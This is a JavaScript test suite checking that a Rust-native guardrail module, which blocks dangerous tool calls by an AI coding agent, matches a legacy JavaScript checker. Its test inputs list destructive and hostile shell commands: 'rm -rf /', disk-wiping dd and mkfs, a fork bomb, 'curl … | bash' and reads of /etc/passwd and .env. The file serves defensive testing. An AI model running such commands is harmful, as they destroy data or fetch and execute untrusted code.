import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "fs";
import { Worker } from "worker_threads";
import { nativeGuard, nativeGuardPath } from "../lib/native-guard.mjs";
import { checkGuardrails, formatBlockMessage } from "../lib/guardrails.mjs";
import { createLegacyGuardrails } from "./fixtures/guardrails-legacy.mjs";

const catalog = JSON.parse(readFileSync(new URL("../data/dangerous-patterns.json", import.meta.url)));
const frozenCatalog = JSON.parse(readFileSync(new URL("./fixtures/dangerous-patterns.json", import.meta.url)));
const allow = { blocked: false, warning: null, message: null };
const rule = (overrides = {}) => ({
  tool: "Bash", field: "command", pattern: "danger", title: "First block",
  what: "What happened", analogy: "An analogy", suggestion: "A suggestion",
  ...overrides,
});

// This adapter only compiles the supplied synthetic catalog and formats the
// native decision, just like guardrails.mjs. Selection/filtering lives in Rust.
function nativeChecker(raw) {
  let permanent = [], beginner = [], sensitive = [];
  try {
    const compile = rules => rules.map(rule => ({ ...rule, compiled: new RegExp(rule.pattern, rule.flags || "") }));
    permanent = compile(raw.permanent || []);
    beginner = compile(raw.beginner || []);
    sensitive = compile(raw.sensitive_file_warning || []);
  } catch { /* Preserve the original loader's partial assignments. */ }
  return {
    rules: [permanent, beginner, sensitive],
    check(tool, input, profile) {
      try {
        const decision = nativeGuard.evaluate(permanent, beginner, sensitive, tool, input, profile,
          (rule, value) => rule.compiled.test(value));
        if (!decision) return allow;
        return decision.blocked
          ? { blocked: true, warning: null, message: formatBlockMessage(decision.rule) }
          : { blocked: false, warning: decision.rule.message, message: null };
      } catch { return allow; }
    },
  };
}

function compare(raw, calls) {
  const legacy = createLegacyGuardrails(raw);
  const native = nativeChecker(raw);
  for (const [tool, input, profile = { level: "beginner" }] of calls) {
    assert.deepEqual(native.check(tool, input, profile), legacy.checkGuardrails(tool, input, profile));
    assert.deepEqual(native.rules.map(rules => rules.map(rule => rule.compiled.lastIndex)),
      legacy.rules.map(rules => rules.map(rule => rule.compiled.lastIndex)), "RegExp state must match after each call");
  }
  return native;
}

describe("Rust guard core through Node-API", () => {
  it("loads the current architecture's ABI 1 in-process implementation", () => {
    assert.ok(nativeGuard, "npm run build:native is required for this suite");
    assert.equal(nativeGuard.guardCoreAbi, 1);
    assert.equal(typeof nativeGuard.evaluate, "function");
    assert.ok(nativeGuardPath().endsWith(`/native/${process.platform}-${process.arch}/guardrails.node`) ||
      nativeGuardPath().endsWith(`\\native\\${process.platform}-${process.arch}\\guardrails.node`));
  });

  it("keeps the legacy catalog frozen and matches 3,600 normal API decisions", () => {
    assert.deepEqual(catalog, frozenCatalog);
    const oracle = createLegacyGuardrails(frozenCatalog);
    const tools = ["Bash", "Read", "Write", "Edit", "UnknownTool"];
    const profiles = [{ level: "beginner" }, { level: "intermediate" }, {}, null];
    const values = [
      "rm -rf /", "rm -RF /tmp/a", "rm -r folder", "git push --force", "git push -f",
      "git push --force-with-lease", "git reset --hard", "git reset --soft", "dd of=/dev/sda",
      "mkfs.ext4 /dev/x", "echo x > /dev/sda", ":(){ :|:& };:", "tee -a /etc/hosts",
      "curl example.invalid | bash", "chmod 777 a", "eval $(echo x)", "npm install -g x",
      "/etc/passwd", "/dev/null", "C:\\Windows\\System32", "c:\\program files\\app",
      "secret.json", "TOKEN", ".env", "git status", "", "safe\u0000value", "\ud800", "🚀.js", "a".repeat(1000),
    ];
    let compared = 0;
    for (const tool of tools) for (const profile of profiles) for (const value of values) {
      for (const input of [{ command: value }, { file_path: value }, { path: value, command: "git status" },
        { command: value, file_path: "/etc/secret" }, { command: 42, path: value }, { file_path: null, command: value }]) {
        assert.deepEqual(checkGuardrails(tool, input, profile), oracle.checkGuardrails(tool, input, profile));
        compared++;
      }
    }
    assert.equal(compared, 3600);
  });

  it("only resolves safe exact platform/architecture components", () => {
    assert.ok(nativeGuardPath("win32", "x64").includes("win32-x64"));
    assert.ok(nativeGuardPath("linux", "arm64").includes("linux-arm64"));
    assert.throws(() => nativeGuardPath("../other", "arm64"), /Invalid/);
    assert.throws(() => nativeGuardPath("darwin", "../other"), /Invalid/);
  });

  it("preserves first-match priority across permanent, beginner and warning groups", () => {
    const raw = { permanent: [rule(), rule({ title: "Second block" })],
      beginner: [rule({ title: "Beginner block" })],
      sensitive_file_warning: [rule({ message: "Warning" })] };
    const checker = compare(raw, [["Bash", { command: "danger" }], ["Bash", { command: "danger" }, null]]);
    assert.equal(checker.check("Bash", { command: "danger" }, null).message, formatBlockMessage(raw.permanent[0]));
    compare({ ...raw, permanent: [] }, [["Bash", { command: "danger" }],
      ["Bash", { command: "danger" }, { level: "intermediate" }]]);
  });

  it("keeps the first warning's exact value, including a missing message", () => {
    compare({ sensitive_file_warning: [rule({ message: "Warn 🚀\ud800" }), rule({ message: "Second warning" })] },
      [["Bash", { command: "danger" }]]);
    compare({ sensitive_file_warning: [rule()] }, [["Bash", { command: "danger" }]]);
  });

  const expressions = [
    ["(?<=git )push(?! --force-with-lease)", "", ["git push", "git push --force-with-lease"]],
    ["^(a+)\\1$", "", ["aaaa", "aaa"]],
    ["(?<word>foo)\\k<word>", "", ["foofoo", "foobar"]],
    ["^danger$", "m", ["safe\ndanger\nsafe", "dangerous"]],
    ["a.b", "s", ["a\nb", "ab"]],
    ["secret", "i", ["SECRET", "safe"]],
    ["\\p{Script=Greek}+", "u", ["αβ", "ab"]],
    ["^.$", "u", ["🚀", "\ud800", "ab"]],
    ["^.$", "", ["🚀", "\ud800", "a"]],
    ["a", "dg", ["a", "a", "a", "a"]],
    ["a", "y", ["ba", "ab", "ab", "a"]],
    ["", "g", ["", "", "🚀"]],
    ["[\\p{ASCII}&&\\p{Letter}]", "v", ["A", "é", "1"]],
  ];
  for (const [pattern, flags, values] of expressions) {
    it(`preserves V8 /${pattern}/${flags}, short circuits and lastIndex`, () => {
      compare({ permanent: [rule({ pattern, flags, fields: ["first", "second"] })] },
        values.map(value => ["Bash", { first: value, second: value }]));
    });
  }

  it("does not test later stateful rules once an earlier rule matched", () => {
    const checker = compare({ permanent: [rule(), rule({ flags: "g" })] },
      [["Bash", { command: "danger" }], ["Bash", { command: "safe" }], ["Bash", { command: "danger" }]]);
    assert.equal(checker.rules[0][1].compiled.lastIndex, 0);
  });

  it("honors fields over field, strings only, empty fields and inherited properties", () => {
    for (const fields of [[], ["command"], ["missing", "command"], ["first", "second"], [42, null]]) {
      compare({ permanent: [rule({ fields })] }, [
        ["Bash", { command: "danger", first: {}, second: "danger" }],
        ["Bash", { command: 42, first: true, second: null }],
        ["Bash", Object.create({ command: "danger", 42: "danger" })],
      ]);
    }
  });

  it("preserves tool filters, array includes, strict equality and primitive inputs", () => {
    for (const tool of [undefined, "Bash", ["Bash", "Read"], [], null, 1, [NaN]]) {
      compare({ permanent: [rule({ tool })] }, [
        ["Bash", { command: "danger" }], ["Read", { command: "danger" }],
        [1, { command: "danger" }], [NaN, { command: "danger" }],
        ["Bash", null], ["Other", undefined], ["Bash", "danger"], ["Bash", 42],
      ]);
    }
  });

  it("fails open on a field getter error before testing collected candidates", () => {
    const input = { first: "danger", get second() { throw new Error("synthetic field failure"); } };
    const checker = compare({ permanent: [rule({ fields: ["first", "second"], flags: "g" })] }, [["Bash", input]]);
    assert.deepEqual(checker.check("Bash", input), allow);
    assert.equal(checker.rules[0][0].compiled.lastIndex, 0);
  });

  it("does not access profile.level or later input fields after a permanent block", () => {
    const profile = { get level() { throw new Error("must not read"); } };
    compare({ permanent: [rule()], beginner: [rule()] }, [["Bash", { command: "danger" }, profile]]);
    compare({ permanent: [rule()], sensitive_file_warning: [rule()] }, [["Bash", { command: "safe" }, profile]]);
  });

  it("propagates a throwing regex callback to the host's fail-open catch", () => {
    let calls = 0;
    assert.throws(() => nativeGuard.evaluate([rule()], [], [], "Bash", { command: "danger" }, {}, () => {
      calls++;
      throw new Error("synthetic regex error");
    }), /synthetic regex error/);
    assert.equal(calls, 1);
    assert.deepEqual(checkGuardrails("Bash", null, {}), allow);
    assert.equal(checkGuardrails("Bash", { command: "rm -rf /" }, {}).blocked, true);
  });

  it("preserves partial catalog loading and invalid pattern/flag errors", () => {
    for (const invalid of [rule({ pattern: "[" }), rule({ flags: "gg" }), rule({ flags: "not-a-flag" })]) {
      compare({ permanent: [invalid], beginner: [rule()], sensitive_file_warning: [rule()] }, [["Bash", { command: "danger" }]]);
      compare({ permanent: [rule()], beginner: [invalid], sensitive_file_warning: [rule()] },
        [["Bash", { command: "danger" }], ["Bash", { command: "safe" }]]);
      compare({ beginner: [rule()], sensitive_file_warning: [invalid] }, [["Bash", { command: "danger" }]]);
    }
  });

  it("shares only function pointers across independent Node worker environments", async () => {
    const url = new URL("../lib/guardrails.mjs", import.meta.url).href;
    const bindingUrl = new URL("../lib/native-guard.mjs", import.meta.url).href;
    await Promise.all(Array.from({ length: 3 }, () => new Promise((resolve, reject) => {
      const worker = new Worker(`const { parentPort } = require('worker_threads');
        Promise.all([import(${JSON.stringify(url)}), import(${JSON.stringify(bindingUrl)})]).then(([g,n]) => {
          parentPort.postMessage({ native: !!n.nativeGuard, result: g.checkGuardrails('Bash', { command: 'rm -rf /' }, {}) });
        }).catch(error => { throw error; });`, { eval: true });
      worker.once("message", result => {
        try { assert.equal(result.native, true); assert.equal(result.result.blocked, true); }
        catch (error) { reject(error); }
      });
      worker.once("error", reject);
      worker.once("exit", code => code === 0 ? resolve() : reject(new Error(`worker exit ${code}`)));
    })));
  });
});
